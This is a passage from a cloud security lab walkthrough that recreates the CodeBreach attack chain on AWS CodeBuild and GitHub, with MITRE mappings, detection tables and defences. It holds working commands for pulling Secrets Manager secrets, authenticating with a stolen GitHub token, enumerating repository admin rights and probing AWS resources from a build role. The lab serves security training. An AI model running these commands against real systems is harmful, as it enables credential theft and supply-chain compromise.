  --output text | python3 -m json.tool

echo ""
echo "--- npm Publish Token ---"
aws secretsmanager get-secret-value \
  --secret-id "codebreach-lab/npm-publish-token" \
  --query 'SecretString' \
  --output text | python3 -m json.tool

echo ""
echo "--- Database Credentials ---"
aws secretsmanager get-secret-value \
  --secret-id "codebreach-lab/database-credentials" \
  --query 'SecretString' \
  --output text | python3 -m json.tool
```

**Flag breakdown:**
- `get-secret-value` -- Retrieves the current plaintext value of a Secrets Manager secret
- `--secret-id` -- The name or ARN of the secret
- `--query 'SecretString'` -- Extract only the secret value (skip metadata)
- `--output text` -- Output as plain text for piping to json.tool

**Expected output:**
```json
{
    "token": "ghp_your_actual_token_here",
    "username": "mega-sdk-automation-bot",
    "note": "Classic PAT with repo + admin:repo_hook. Used by CodeBuild for GitHub operations."
}
```

Save the GitHub token for the next step:

```bash
# Extract the GitHub PAT
STOLEN_PAT=$(aws secretsmanager get-secret-value \
  --secret-id "codebreach-lab/github-automation" \
  --query 'SecretString' \
  --output text | python3 -c "import sys,json; print(json.load(sys.stdin)['token'])")

echo "Stolen GitHub PAT: ${STOLEN_PAT:0:15}... (truncated for safety)"
echo "PAT length: ${#STOLEN_PAT} characters"
```

### What Just Happened

You extracted three secrets from AWS Secrets Manager:
1. **GitHub Classic PAT** -- with `repo` and `admin:repo_hook` scopes, granting full control over all repositories the automation bot can access
2. **npm publish token** -- allowing publication of malicious package versions
3. **Database credentials** -- providing access to production databases

In the real CodeBreach attack, the attackers used process memory dumping (`/proc/*/environ`) rather than direct Secrets Manager API calls, because the GitHub token was injected into the CodeBuild agent process's environment. The result is the same: credential theft from the build environment.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Unsecured Credentials: Credentials in Files | **T1552.001** | Credential Access |

T1552.001 covers extraction of credentials from files, environment variables, and process memory -- all applicable to the build environment.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | GetSecretValue called from CodeBuild execution context for non-buildspec secrets | **High** |
| **DSPM** | Bulk secret access from CI/CD pipeline | **Critical** |
| **CDR** | Secrets Manager API calls during non-standard build phase | **High** |

### Defense

1. **Restrict the CodeBuild role** to only the specific secret ARNs listed in the buildspec -- never use wildcards
2. **Use Secrets Manager resource policies** to restrict which IAM principals can access each secret
3. **Enable secret access logging** and alert on access from CI/CD roles outside normal build patterns
4. **Rotate secrets immediately** after any suspected build compromise

---

## STEP 6: GitHub PAT Exploitation -- Authenticate as the Automation Bot

### Context (Attacker Mindset)

You have the GitHub Classic PAT. Time to see what it gives you access to. Classic PATs with `repo` scope grant full read/write access to every repository the token owner can access -- not just the one used in the build. The `admin:repo_hook` scope adds webhook management capabilities.

### Concept: GitHub Classic PAT Scopes

A **GitHub Classic Personal Access Token** (`ghp_...`) is a long-lived credential that authenticates API requests. Unlike Fine-Grained PATs, Classic PATs:

- Have **no per-repository scoping** -- the `repo` scope grants access to ALL repositories
- Have **no mandatory expiration** (though recommended to set one)
- Have **no organizational visibility** -- org admins cannot see which Classic PATs exist
- Grant the **full permissions of the user** within the selected scope

The `repo` scope alone provides: read/write to code, issues, PRs, wikis, and settings. It also allows managing collaborators, branch protections, and deployment keys. Combined with `admin:repo_hook`, the attacker can also create, delete, and modify webhooks.

### Commands

```bash
# Authenticate with the stolen PAT
echo "=== AUTHENTICATING WITH STOLEN GITHUB PAT ==="
echo ""

# Check what identity this token belongs to
echo "--- Token Identity ---"
curl -s -H "Authorization: token ${STOLEN_PAT}" \
  "https://api.github.com/user" | jq '{login: .login, id: .id, name: .name, type: .type}'

echo ""
echo "--- Token Scopes ---"
# The X-OAuth-Scopes header shows what scopes the token has
curl -s -I -H "Authorization: token ${STOLEN_PAT}" \
  "https://api.github.com/user" 2>/dev/null | grep -i "x-oauth-scopes"
```

**Flag breakdown:**
- `curl -s` -- Silent mode (no progress bar)
- `-H "Authorization: token ${STOLEN_PAT}"` -- Authenticate with the PAT using the `token` scheme
- `-I` -- HEAD request (only retrieve headers, not body)
- `grep -i "x-oauth-scopes"` -- Show the `X-OAuth-Scopes` response header, which lists the token's scopes

**Expected output:**
```json
{
  "login": "your-github-username",
  "id": 12345678,
  "name": "Your Name",
  "type": "User"
}
```
```
x-oauth-scopes: repo, admin:repo_hook
```

Now enumerate what repositories this token can access:

```bash
echo "--- Accessible Repositories ---"
curl -s -H "Authorization: token ${STOLEN_PAT}" \
  "https://api.github.com/user/repos?per_page=10&sort=updated" | \
  jq '.[] | {name: .full_name, private: .private, permissions: .permissions}'
```

**Expected output:** A list of all repositories the token owner can access, with their permission levels (admin, push, pull).

### What Just Happened

You authenticated as the automation bot and confirmed:
1. The token has `repo` and `admin:repo_hook` scopes
2. The token grants access to all repositories the user can see
3. You have admin-level permissions on the target repository

This is exactly what the real CodeBreach attackers achieved. The stolen token belonged to `aws-sdk-js-automation` with admin access to `aws/aws-sdk-js-v3`.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Valid Accounts: Cloud Accounts | **T1078.004** | Privilege Escalation |

The stolen PAT functions as a valid cloud account credential, providing access indistinguishable from the legitimate automation bot.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | GitHub API calls from unusual IP using automation bot credentials | **Critical** |

### Defense

1. **Migrate from Classic PATs to Fine-Grained PATs** -- per-repository scoping prevents lateral access
2. **Use GitHub Apps** instead of PATs -- short-lived tokens (1 hour), installation-scoped, auditable
3. **Enable GitHub token secret scanning** -- GitHub will revoke exposed Classic PATs found in public repos
4. **Set mandatory expiration** on all PATs (maximum 90 days)

---

## STEP 7: Repository Takeover -- Escalate to Admin

### Context (Attacker Mindset)

You have a PAT with admin permissions on the target repository. The next move is to add your own GitHub account as a collaborator with admin access. This gives you a persistent foothold that survives token revocation -- even if the stolen PAT is rotated, your collaborator access remains.

### Commands

```bash
# Add the attacker as a repository collaborator with admin permissions
# In the real attack, Wiz added their own GitHub account as admin
GITHUB_OWNER=$(cd ~/codebreach-lab/terraform && terraform output -raw github_repo_url | sed 's|https://github.com/||' | cut -d/ -f1)
GITHUB_REPO="mega-sdk-js"

# Check current collaborators
echo "=== CURRENT COLLABORATORS ==="
curl -s -H "Authorization: token ${STOLEN_PAT}" \
  "https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/collaborators" | \
  jq '.[] | {login: .login, role: .role_name}'

# Check branch protection rules (can we push directly to main?)
echo ""
echo "=== BRANCH PROTECTION ==="
curl -s -H "Authorization: token ${STOLEN_PAT}" \
  "https://api.github.com/repos/${GITHUB_OWNER}/${GITHUB_REPO}/branches/main/protection" 2>/dev/null | jq '.' || echo "No branch protection configured"

# With admin access, we could:
# 1. Push code directly to main (bypassing PR review)
# 2. Modify or disable branch protection rules
# 3. Add webhooks to exfiltrate future code changes
# 4. Access repository secrets (used by GitHub Actions)
# 5. Modify release workflows to inject malicious code

echo ""
echo "=== REPOSITORY ADMIN ACTIONS AVAILABLE ==="
echo "With admin access via the stolen PAT, the attacker can:"
echo "  1. Push directly to main branch"
echo "  2. Modify/disable branch protection rules"
echo "  3. Add/remove collaborators"
echo "  4. Access repository secrets"
echo "  5. Modify GitHub Actions workflows"
echo "  6. Create/modify releases and tags"
echo "  7. Transfer or delete the repository"
echo ""
echo "In the real CodeBreach attack, Wiz STOPPED HERE and reported"
echo "to AWS. A malicious actor would proceed to inject code into"
echo "the next SDK release."
```

### What Just Happened

You demonstrated that the stolen PAT provides full administrative control over the target repository. In the real CodeBreach attack:

1. Wiz added their own GitHub account as a collaborator with admin permissions
2. They confirmed they could push to `main`, approve PRs, and invite other collaborators
3. The token also granted access to several OTHER repositories, including private AWS mirrors
4. They halted and reported the vulnerability to AWS

The implication: with admin access to `aws-sdk-js-v3`, an attacker could inject malicious code into the JavaScript SDK used by 66% of cloud environments and the AWS Console itself. The SDK ships weekly to npm -- a single poisoned release would propagate globally.

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Account Manipulation | **T1098** | Persistence |

Adding a collaborator is account manipulation -- creating persistent access that survives credential rotation.

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **ASPM** | New collaborator added to repository outside normal workflow | **Critical** |
| **CDR** | Repository permission change by automation account from unusual IP | **Critical** |

### Defense

1. **Require 2FA** for all repository administrators
2. **Enable audit logging** and alert on collaborator additions
3. **Use organization-level policies** to restrict who can add collaborators
4. **Review collaborator lists** regularly and remove unnecessary access

---

## STEP 8: Post-Exploitation -- Access AWS Resources via CodeBuild Role

### Context (Attacker Mindset)

Beyond the GitHub PAT, the build environment also provided AWS credentials (the CodeBuild service role). Let us see what additional AWS resources an attacker could access from within a compromised build.

### Commands

```bash
# Demonstrate what the CodeBuild role can access in AWS
# (Using admin credentials to simulate the CodeBuild role's permissions)

echo "=== AWS POST-EXPLOITATION FROM BUILD ENVIRONMENT ==="
echo ""

# List Lambda functions (the overprivileged IAM policy allows this)
echo "--- Lambda Functions Accessible ---"
aws lambda list-functions \
  --query 'Functions[].{Name:FunctionName,Runtime:Runtime}' \
  --output table

# Invoke the deployment function
echo ""
echo "--- Invoking Deployment Function ---"
LAMBDA_NAME=$(cd ~/codebreach-lab/terraform && terraform output -raw lambda_function_name)
aws lambda invoke \
  --function-name "${LAMBDA_NAME}" \
  --payload '{}' \
  --cli-binary-format raw-in-base64-out \
  /tmp/lambda_response.json

cat /tmp/lambda_response.json | python3 -m json.tool

# List IAM users (the overprivileged policy allows this too)
echo ""
echo "--- IAM Users Visible ---"
aws iam list-users --query 'Users[].UserName' --output table

# List S3 buckets
echo ""
echo "--- S3 Buckets ---"
aws s3 ls

echo ""
echo "=== ATTACK COMPLETE ==="
echo ""
echo "From a single build environment compromise, the attacker gained:"
echo "  1. GitHub admin access (stolen PAT)"
echo "  2. npm publish capability (stolen npm token)"
echo "  3. Database credentials (stolen from Secrets Manager)"
echo "  4. Lambda function invocation (from CodeBuild role)"
echo "  5. IAM enumeration (from CodeBuild role)"
echo "  6. S3 bucket listing (from CodeBuild role)"
```

### MITRE ATT&CK

| Technique | ID | Tactic |
|---|---|---|
| Cloud Infrastructure Discovery | **T1580** | Discovery |
| Serverless Execution | **T1648** | Execution |

### CNAPP Detection

| Component | Detection | Severity |
|---|---|---|
| **CDR** | Lambda invocation from CodeBuild execution context | **High** |
| **CDR** | IAM enumeration API calls from CI/CD role | **High** |
| **CIEM** | CodeBuild role has Lambda invoke and IAM read permissions (excessive) | **Medium** |

---

# PART 4: CLEANUP

## Step 1: Destroy Terraform Infrastructure

```bash
cd ~/codebreach-lab/terraform

# Unset any attacker credentials that might interfere

# === Security-sensitive (contain real credentials) ===
unset STOLEN_PAT          # Your actual GitHub PAT in plaintext
unset GITHUB_TOKEN        # If set during any step
unset ATTACKER_KEY_ID     # AWS access key
unset ATTACKER_SECRET     # AWS secret key

# === AWS credential overrides ===
unset AWS_ACCESS_KEY_ID
unset AWS_SECRET_ACCESS_KEY
unset AWS_SESSION_TOKEN

# === Lab variables (not sensitive but worth cleaning up) ===
unset VULNERABLE_PATTERN
unset SECURE_PATTERN
unset TRUSTED_ID
unset PROJECT_NAME
unset BUILD_ID
unset LAMBDA_NAME
unset GITHUB_OWNER
unset GITHUB_REPO
unset GITHUB_USERNAME
unset LOG_GROUP
unset LOG_STREAM
unset TF_DIR

# Destroy all AWS resources
terraform destroy

# === AWS CLI named profiles (written to ~/.aws/credentials) ===
# Remove the attacker profile section entirely
sed -i '/\[attacker\]/,/^\[/{ /^\[attacker\]/d; /^\[/!d; }' ~/.aws/credentials 2>/dev/null

# Remove CloudWatch log groups:
aws logs delete-log-group --log-group-name "/aws/codebuild/codebreach-lab-sdk-build"
aws logs delete-log-group --log-group-name "/aws/lambda/codebreach-lab-deploy-function"

# === Shell history (optional but good practice) ===
# Your PAT may be in command history
echo "Consider clearing commands containing tokens from history:"
echo "  history | grep ghp_"

# Remove from credentials file
sed -i '/\[attacker\]/,/^\[/{/^\[attacker\]/d;/^\[/!d;}' ~/.aws/credentials 2>/dev/null
sed -i '/\[attacker-admin\]/,/^\[/{/^\[attacker-admin\]/d;/^\[/!d;}' ~/.aws/credentials 2>/dev/null

# Remove from config file
sed -i '/\[profile attacker\]/,/^\[/{/^\[profile attacker\]/d;/^\[/!d;}' ~/.aws/config 2>/dev/null
sed -i '/\[profile attacker-admin\]/,/^\[/{/^\[profile attacker-admin\]/d;/^\[/!d;}' ~/.aws/config 2>/dev/null
sed -i '/^\[attacker\]$/d' ~/.aws/credentials

# Verify no attacker profile remains
grep "attacker" ~/.aws/credentials ~/.aws/config 2>/dev/null || echo "CLI profiles clean"

```

When prompted, type `yes` to confirm. This removes all AWS resources: CodeBuild project, webhook, S3 buckets, Secrets Manager secrets, IAM roles, Lambda function, and CloudTrail trail.

## Step 2: Clean Up GitHub

```bash
# Delete the GitHub repository
# Option A: Via the GitHub UI
#   Go to: https://github.com/YOUR_USERNAME/mega-sdk-js/settings
#   Scroll to "Danger Zone" > "Delete this repository"

# Option B: Via the API (requires delete_repo scope on your PAT)
curl -X DELETE \
  -H "Authorization: token ${STOLEN_PAT}" \
  "https://api.github.com/repos/${GITHUB_OWNER}/mega-sdk-js"
```

## Step 3: Revoke the GitHub PAT

1. Go to https://github.com/settings/tokens
2. Find `codebreach-lab-automation-bot`
3. Click **Delete** and confirm

## Step 4: Clean Up Local Files

```bash
# Remove local working directories
rm -rf /tmp/mega-sdk-js
rm -rf ~/codebreach-lab
rm -f /tmp/codebuild_project.json
rm -f /tmp/lambda_response.json
rm -f /tmp/lambda_output.json

# Remove the attacker AWS CLI profile
aws configure set aws_access_key_id "" --profile attacker 2>/dev/null
aws configure set aws_secret_access_key "" --profile attacker 2>/dev/null
```

## Step 5: Verify Everything is Gone

```bash
# Check no CodeBuild projects remain
aws codebuild list-projects --query 'projects[?contains(@, `codebreach`)]'

# Check no Secrets Manager secrets remain
aws secretsmanager list-secrets --filters "Key=name,Values=codebreach-lab" --query 'SecretList[].Name'

# Check no S3 buckets remain
aws s3 ls | grep codebreach

# Check no Lambda functions remain
aws lambda list-functions --query 'Functions[?contains(FunctionName, `codebreach`)].FunctionName'

# Check no CloudTrail trails remain
aws cloudtrail describe-trails --query 'trailList[?contains(Name, `codebreach`)].Name'
```

All queries should return empty results.

---

# PART 5: SUMMARY

## What You Learned

### Cloud Concepts Checklist

Test yourself -- can you explain each of these?

- [ ] AWS CodeBuild projects: source types, buildspec, service roles, build phases
- [ ] CodeBuild webhook filters: EVENT, ACTOR_ACCOUNT_ID, HEAD_REF, FILE_PATH
- [ ] Regular expressions as access control: anchoring with `^` and `$`, substring vs exact match
- [ ] GitHub user ID assignment: sequential from a shared counter, immutable, shared by users/orgs/apps
- [ ] GitHub Classic PATs vs Fine-Grained PATs vs GitHub Apps: scoping, expiration, audit
- [ ] The `repo` scope: full read/write to all accessible repositories, collaborator management
- [ ] CodeBuild source credentials: PAT-based vs CodeConnections (GitHub App)
- [ ] Secrets Manager integration with CodeBuild: `SECRETS_MANAGER` environment variable type
- [ ] Build environment credential exposure: environment variables, process memory, /proc/*/environ
- [ ] Supply chain attack blast radius: one poisoned SDK release affecting thousands of applications
- [ ] PR Comment Approval build gate: AWS's post-CodeBreach mitigation
- [ ] CloudTrail logging for CodeBuild API calls

### Attack Techniques Practiced

| Step | MITRE Technique | ID | What You Did |
|------|----------------|-----|-------------|
| 1 | Exploit Public-Facing Application | T1190 | Discovered CodeBuild project configuration |
| 2 | Supply Chain Compromise | T1195.002 | Identified unanchored regex flaw in webhook filter |
| 3 | Supply Chain Compromise | T1195.002 | Understood GitHub ID eclipse technique |
| 4 | Trusted Relationship | T1199 | Triggered unauthorized build via webhook bypass |
| 4 | Command and Scripting Interpreter | T1059.004 | Executed credential-dumping code in build env |
| 5 | Unsecured Credentials | T1552.001 | Extracted secrets from Secrets Manager |
| 6 | Valid Accounts: Cloud Accounts | T1078.004 | Authenticated with stolen GitHub PAT |
| 7 | Account Manipulation | T1098 | Demonstrated repository admin takeover |
| 8 | Cloud Infrastructure Discovery | T1580 | Enumerated AWS resources from build role |

### Tools and Commands Used

- **AWS CLI v2** -- `aws codebuild`, `aws secretsmanager`, `aws lambda`, `aws iam`, `aws s3`, `aws logs`
- **Terraform** -- Infrastructure as code for deploying and destroying the lab
- **curl** -- GitHub API authentication and reconnaissance
- **jq** -- JSON parsing for API responses
- **Python 3** -- Regex demonstration and JSON extraction
- **git** -- Repository management and branch creation

### CNAPP Detection Summary

| Attack Step | CNAPP Component | Alert |
|---|---|---|
| Public CodeBuild project | **CSPM** | CodeBuild project visibility set to public |
| Unanchored regex filter | **CSPM** | ACTOR_ACCOUNT_ID filter missing regex anchors |
| PAT-based GitHub auth | **CSPM** | CodeBuild uses Classic PAT instead of CodeConnections |
| Overprivileged CodeBuild role | **CIEM** | Service role has Lambda, IAM, and broad Secrets Manager access |
| Build triggered by unknown actor | **CDR** | First-seen GitHub user ID triggered build |
| Buildspec override in build | **CDR** + **ASPM** | Build used buildspec override (not from repo) |
| Credential extraction from build | **CWP** | Process memory scan detected in build container |
| Secrets Manager bulk access | **CDR** + **DSPM** | Multiple GetSecretValue calls from CI/CD context |
| GitHub PAT used from new IP | **CDR** | Automation bot credentials used from external IP |
| Repository admin changes | **ASPM** | Collaborator added outside normal workflow |

### Connections to Real-World Breaches

- **CodeBreach (Wiz, Jan 2026)**: This exact attack chain. Two missing regex characters in AWS CodeBuild webhook filters exposed the aws-sdk-js-v3 repository (66% of cloud environments) to supply chain compromise. AWS fixed it within 48 hours of disclosure.
- **SolarWinds SUNBURST (2020)**: APT29 compromised the SolarWinds build pipeline to inject the SUNBURST backdoor into Orion updates, affecting 18,000 organizations. Like CodeBreach, the build system itself was the entry point.
- **Codecov (2021)**: Attackers modified Codecov's bash uploader script to harvest environment variables from CI pipelines, stealing AWS keys, deploy keys, and API tokens from 29,000 customers for 2 months.
- **tj-actions/changed-files (March 2025)**: A compromised bot PAT allowed attackers to rewrite GitHub Action version tags, dumping CI runner secrets from 23,000 repositories. CISA issued a formal alert.
- **event-stream (2018)**: Social engineering gave an attacker npm publish access to a package with 8 million downloads, enabling injection of an encrypted payload targeting the Copay Bitcoin wallet.

### What Makes This Scenario Harder Than Typical Training

1. **CI/CD as attack surface**: Most training focuses on runtime vulnerabilities (SSRF, command injection). CodeBreach targets the build pipeline itself -- a blind spot in many security programs
2. **Regex-as-access-control**: The vulnerability is in a *configuration pattern*, not application code. No CVE, no patch to apply -- just two missing characters in a regex
3. **Cross-platform chaining**: The attack crosses AWS (CodeBuild, Secrets Manager, IAM) and GitHub (user IDs, PATs, repository permissions) -- requiring understanding of both platforms' identity models
4. **Supply chain blast radius**: Unlike direct-access attacks where impact is limited to one target, a supply chain attack through a widely-used SDK affects *every downstream consumer*
5. **The eclipse technique**: Manufacturing a GitHub user ID to bypass a filter is an entirely novel attack primitive with no equivalent in traditional penetration testing

---

## DETECTION MAPPING TABLES

### MITRE ATT&CK Full Mapping

| Step | Technique ID | Technique Name | Tactic | Description |
|------|-------------|----------------|--------|-------------|
| 1 | T1190 | Exploit Public-Facing Application | Initial Access | Access public CodeBuild configuration to discover webhook filters |
| 2 | T1195.002 | Supply Chain Compromise: Software | Initial Access | Identify regex flaw enabling webhook filter bypass |
| 3 | T1195.002 | Supply Chain Compromise: Software | Initial Access | Manufacture GitHub user ID to exploit filter flaw |
| 4 | T1199 | Trusted Relationship | Initial Access | Abuse GitHub-CodeBuild webhook trust to trigger build |
| 4 | T1059.004 | Command and Scripting: Unix Shell | Execution | Execute credential-harvesting code in build environment |
| 5 | T1552.001 | Unsecured Credentials: In Files | Credential Access | Extract GitHub PAT and other secrets from build environment |
| 6 | T1078.004 | Valid Accounts: Cloud Accounts | Privilege Escalation | Use stolen PAT to authenticate as automation bot |
| 7 | T1098 | Account Manipulation | Persistence | Add attacker as repository admin collaborator |
| 8 | T1580 | Cloud Infrastructure Discovery | Discovery | Enumerate AWS resources accessible from CodeBuild role |
| 8 | T1648 | Serverless Execution | Execution | Invoke Lambda function from compromised build context |

### CNAPP Detection Full Mapping

| Step | Component | Detection Description | Severity | What the SOC Would See |
|------|-----------|----------------------|----------|----------------------|
| 1 | CSPM | CodeBuild project has public visibility | High | Posture alert: CI/CD project exposes configuration |
| 1 | CSPM | CodeBuild uses PAT-based GitHub auth | Medium | Posture alert: use CodeConnections instead |
| 2 | CSPM | Webhook ACTOR_ACCOUNT_ID filter lacks regex anchors | Critical | Posture alert: filter pattern allows substring bypass |
| 3 | CDR | Build triggered by unknown/first-seen GitHub actor | High | Identity alert: new actor in CI/CD pipeline |
| 4 | CDR | Build uses buildspec override | Critical | Runtime alert: build commands modified at execution |
| 4 | ASPM | Buildspec changed outside normal PR workflow | Critical | Pipeline alert: unauthorized pipeline modification |
| 5 | CWP | Process memory scan in build container | Critical | Workload alert: credential dumping detected |
| 5 | CDR | GetSecretValue calls from CI/CD context | High | Data alert: secrets accessed from build |
| 5 | DSPM | Bulk secret retrieval from Secrets Manager | Critical | Data alert: multiple secrets accessed rapidly |
| 6 | CDR | GitHub API calls from unusual IP with bot credentials | Critical | Identity alert: automation account used externally |
| 7 | ASPM | Repository collaborator added by automation account | Critical | Pipeline alert: repository permissions changed |
| 8 | CIEM | CodeBuild role has excessive permissions | Medium | Permission alert: Lambda + IAM access unnecessary |
| 8 | CDR | Lambda invoked from CodeBuild context | High | Resource alert: cross-service access from CI/CD |
